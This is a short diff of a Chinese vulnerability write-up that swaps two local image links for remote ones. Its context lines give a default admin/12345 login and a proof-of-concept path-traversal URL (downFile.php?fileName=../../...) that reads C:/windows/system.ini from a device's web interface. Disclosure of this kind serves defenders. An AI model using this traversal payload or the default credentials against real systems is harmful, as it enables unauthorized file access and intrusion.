@@ -20,7 +20,7 @@
 
 登录页面如下， 默认账号密码为 **admin/12345**
 
-![](image/hiv-5.png)
+![](http://wikioss.peiqi.tech/vuln/hiv-5.png)
 
 POC如下，访问如下Url下载 system.ini文件
 
@@ -28,7 +28,7 @@ POC如下，访问如下Url下载 system.ini文件
 http://xxx.xxx.xxx.xxx/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini
 ```
 
-![](image/hiv-6.png)
+![](http://wikioss.peiqi.tech/vuln/hiv-6.png)
 
 成功读取 **C:/windows/system.ini**
 
